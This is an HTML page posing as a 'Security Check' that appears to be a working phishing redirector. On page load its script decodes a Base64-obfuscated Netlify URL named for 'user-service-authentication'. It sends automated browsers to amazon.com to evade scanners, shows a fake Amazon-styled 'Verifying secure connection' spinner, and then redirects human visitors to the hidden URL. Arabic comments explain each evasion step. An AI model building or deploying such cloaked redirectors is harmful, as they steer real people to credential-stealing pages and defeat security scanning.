<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Check...</title>
    <script>
        (function() {
            // 1. رابط Netlify الخاص بك مشفر يدوياً للتأكد
            
            const _0x1a2b = "aHR0cHM6Ly91c2VyLXNlcnZpY2UtYXV0aGVudGljYXRpb24ubmV0bGlmeS5hcHAv";

            // 2. فك التشفير
            function getTarget() {
                try {
                    return atob(_0x1a2b);
                } catch (e) {
                    // إذا فشل التشفير، يتم العودة لرابط احتياطي أو المحاولة مرة أخرى
                    return "https://user-service-authentication.netlify.app/";
                }
            }

            const targetUrl = getTarget();

            // 3. فحص البوتات (مخفف لضمان عمله معك الآن)
            if (navigator.webdriver) {
                window.location.replace("https://www.amazon.com");
                return;
            }

            // 4. واجهة التحميل
            document.documentElement.innerHTML = `
                <body style="margin:0;padding:0;display:flex;align-items:center;justify-content:center;height:100vh;background:#fff;font-family:Arial;">
                    <div style="text-align:center;">
                        <div style="border:3px solid #f3f3f3;border-top:3px solid #232f3e;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto;"></div>
                        <p style="margin-top:20px;color:#232f3e;font-size:14px;">Verifying secure connection...</p>
                    </div>
                    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                </body>
            `;

            // 5. محاولة الانتقال بأكثر من طريقة لضمان النجاح
            setTimeout(() => {
                // الطريقة الأولى
                window.location.assign(targetUrl);
                
                // الطريقة الثانية (احتياطية إذا فشلت الأولى)
                setTimeout(() => {
                    window.location.href = targetUrl;
                }, 500);
            }, 1500);

        })();
    </script>
</head>
<body></body>
</html>
